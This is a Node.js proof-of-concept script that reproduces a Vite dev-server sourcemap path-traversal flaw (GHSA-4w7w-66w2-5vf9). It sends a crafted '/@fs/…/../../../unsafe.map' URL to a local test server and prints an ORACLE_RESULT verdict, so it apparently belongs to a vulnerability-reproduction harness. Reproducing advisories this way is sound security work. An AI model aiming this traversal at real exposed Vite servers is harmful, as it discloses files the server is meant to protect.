const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');

(async () => {
  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';
  let server = null;

  try {
    const vite = require('vite');

    const marker = 'vite-ghsa-4w7w-66w2-5vf9-' + process.pid + '-' + Date.now();
    const base = path.join(os.tmpdir(), marker);
    const root = path.join(base, 'project');
    const srcDir = path.join(root, 'src');
    const depDir = path.join(root, 'node_modules', '.vite', 'deps');
    const outsideMap = path.join(base, 'unsafe.map');

    fs.mkdirSync(srcDir, { recursive: true });
    fs.mkdirSync(depDir, { recursive: true });

    fs.writeFileSync(path.join(root, 'index.html'), '<!doctype html><script type="module" src="/src/main.js"></script>');
    fs.writeFileSync(path.join(srcDir, 'main.js'), 'export const ok = 123; console.log(ok);');
    fs.writeFileSync(path.join(depDir, 'placeholder.js'), 'export default 1;');
    fs.writeFileSync(outsideMap, JSON.stringify({ version: 3, sources: [], names: [], mappings: '', leaked: marker }));

    server = await vite.createServer({
      root,
      logLevel: 'silent',
      appType: 'spa',
      server: { host: true, port: 0, fs: { strict: true } },
      optimizeDeps: { noDiscovery: true }
    });

    await server.listen();

    const benign = await server.transformRequest('/src/main.js');
    if (!benign || typeof benign.code !== 'string' || benign.code.indexOf('ok = 123') === -1) {
      throw new Error('benign transform failed');
    }

    operation_completed = true;

    const depPosix = depDir.split(path.sep).join('/');
    const maliciousUrl = '/@fs/' + depPosix + '/../../../unsafe.map';

    const body = await new Promise((resolve, reject) => {
      const req = { method: 'GET', url: maliciousUrl, headers: {} };
      const chunks = [];
      const res = {
        statusCode: 200,
        setHeader() {},
        getHeader() { return undefined; },
        removeHeader() {},
        writeHead(code) { this.statusCode = code; },
        write(chunk) { if (chunk != null) chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(String(chunk))); },
        end(chunk) {
          if (chunk != null) chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(String(chunk)));
          resolve(Buffer.concat(chunks).toString('utf8'));
        }
      };

      try {
        server.middlewares(req, res, (err) => {
          if (err) reject(err);
          else resolve(Buffer.concat(chunks).toString('utf8'));
        });
      } catch (e) {
        reject(e);
      }
    });

    if (typeof body === 'string' && body.includes(marker)) {
      exploit_succeeded = true;
      evidence = 'outside .map content disclosed via optimized-deps sourcemap path traversal';
    } else {
      exploit_succeeded = false;
      evidence = 'no outside marker disclosure in sourcemap response';
    }
  } catch (err) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'setup_or_runtime_failure: ' + (err && err.message ? err.message : String(err));
  } finally {
    if (server) {
      try { await server.close(); } catch (_) {}
    }
  }

  console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
})();